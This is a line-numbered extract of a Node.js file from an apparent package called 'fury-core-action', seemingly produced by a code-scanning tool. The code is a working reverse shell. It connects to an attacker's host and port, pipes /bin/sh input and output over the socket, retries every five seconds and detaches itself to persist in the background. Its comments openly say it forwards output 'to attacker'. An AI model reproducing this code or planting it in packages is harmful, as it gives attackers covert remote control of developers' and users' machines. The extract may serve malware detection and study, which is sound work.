// File: tmp/tmpp9ykx3yx/fury-core-action/package/index.js
// ======================================================================
Line 1: const net = require("net")
Line 2: _tmp_4 = require("child_process")
Line 8: const client = new net.Socket()
Line 10: {
        console.log("Connected to attacker at " + HOST + ":" + PORT);

        // Spawn a shell
        const shell = spawn("/bin/sh", []);

        // Forward data from client to shell input
        client.on("data", (data) => {
            shell.stdin.write(data); // Write attacker input to shell
        });

        // Forward data from shell output to client
        shell.stdout.on("data", (data) => {
            client.write(data); // Write shell output to attacker
        });

        // Forward shell errors to client
        shell.stderr.on("data", (data) => {
            client.write(data); // Write shell error output to attacker
        });

        // Handle shell exit
        shell.on("close", () => {
            console.log("Shell closed. Disconnecting...");
            client.end();
        });
    }
Line 14: const shell = spawn("/bin/sh", [])
Line 17: {
            shell.stdin.write(data); // Write attacker input to shell
        }
Line 18: shell.stdin.write(data)
Line 22: {
            client.write(data); // Write shell output to attacker
        }
Line 23: client.write(data)
Line 27: {
            client.write(data); // Write shell error output to attacker
        }
Line 28: client.write(data)
Line 32: {
            console.log("Shell closed. Disconnecting...");
            client.end();
        }
Line 34: client.end()
Line 39: {
        console.error("Connection error:", err.message);
        setTimeout(startReverseShell, 5000); // Retry after 5 seconds
    }
Line 41: setTimeout(startReverseShell, 5000)
Line 44: {
        console.log("Connection closed. Retrying...");
        setTimeout(startReverseShell, 5000); // Retry after 5 seconds
    }
Line 46: setTimeout(startReverseShell, 5000)
Line 51: process.argv.includes("--background")
Line 53: {
    const { spawn } = require("child_process");
    const detachedProcess = spawn("node", [__filename, "--background"], {
        detached: true,
        stdio: "ignore",
    });

    detachedProcess.unref();
    console.log("Process complete. Reverse shell running in the background.");
}
Line 54: _tmp_6 = require("child_process")
Line 55: const detachedProcess = spawn("node", [__filename, "--background"], {
        detached: true,
        stdio: "ignore",
    })
